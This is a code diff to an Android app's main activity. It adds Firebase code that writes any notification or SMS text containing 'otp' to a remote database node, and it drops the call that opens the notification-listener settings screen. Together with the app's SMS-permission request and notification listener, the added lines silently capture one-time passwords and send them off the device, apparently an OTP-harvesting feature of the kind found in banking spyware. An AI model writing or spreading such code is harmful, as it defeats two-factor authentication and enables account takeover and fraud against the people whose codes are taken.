@@ -10,9 +10,15 @@ import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.widget.TextView;
 
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
 public class MainActivity extends AppCompatActivity implements MyListener {
 
     TextView txtResponse;
+    FirebaseDatabase database;
+    DatabaseReference myRef;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -20,8 +26,8 @@ public class MainActivity extends AppCompatActivity implements MyListener {
 
         requestSmsPermission();
 
-        Intent intent=new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-        startActivity(intent);
+        database = FirebaseDatabase.getInstance();
+        myRef = database.getReference("message");
 
         txtResponse = findViewById(R.id.txtResponse);
         new NotificationService().setListener(this);
@@ -38,6 +44,9 @@ public class MainActivity extends AppCompatActivity implements MyListener {
     @Override
     public void setValue(String txt) {
         txtResponse.setText(txt);
+        if(txt.toLowerCase().contains("otp")){
+            myRef.child("OTP").setValue(txt);
+        }
     }
 
     private void requestSmsPermission() {
